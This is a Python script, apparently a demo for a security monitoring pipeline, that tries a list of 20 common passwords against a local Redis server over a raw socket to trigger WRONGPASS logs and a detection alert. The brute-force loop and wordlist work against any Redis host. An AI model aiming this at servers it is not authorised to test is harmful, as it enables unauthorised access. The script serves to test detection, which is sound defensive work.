"""
Redis Brute Force Demo
Sends AUTH commands with wrong passwords → aisoc-redis logs WRONGPASS
→ log_agent's _DOCKER_AUTH_FAIL regex detects it → ML pipeline → alert
"""
import socket
import time

HOST = "localhost"
PORT = 6379

WORDLIST = [
    "admin", "password", "123456", "redis", "root",
    "letmein", "qwerty", "secret", "pass", "default",
    "redis123", "admin123", "test", "1234", "password1",
    "P@ssw0rd", "redispass", "cache", "master", "changeme",
]

def redis_auth(host, port, password):
    """Send AUTH command and return the server response."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        cmd = f"*2\r\n$4\r\nAUTH\r\n${len(password)}\r\n{password}\r\n"
        s.sendall(cmd.encode())
        resp = s.recv(128).decode(errors='ignore').strip()
        s.close()
        return resp
    except Exception as e:
        return f"error: {e}"


def main():
    print("=" * 55)
    print("  REDIS BRUTE FORCE — aisoc-redis :6379")
    print("  Each WRONGPASS → log_agent captures → ML alert")
    print("=" * 55)

    success = 0
    for i, pwd in enumerate(WORDLIST, 1):
        resp = redis_auth(HOST, PORT, pwd)
        if "+OK" in resp:
            print(f"  [{i:02d}] '{pwd}' → ✅ CORRECT PASSWORD!")
            success += 1
        elif "WRONGPASS" in resp:
            print(f"  [{i:02d}] '{pwd}' → ❌ WRONGPASS (logged in Redis)")
        else:
            print(f"  [{i:02d}] '{pwd}' → {resp}")
        time.sleep(0.2)

    print(f"\n  Done — {len(WORDLIST)} attempts, {success} hits")
    print("  Check: docker logs aisoc-redis | grep -i wrongpass")
    print("=" * 55)


if __name__ == "__main__":
    main()
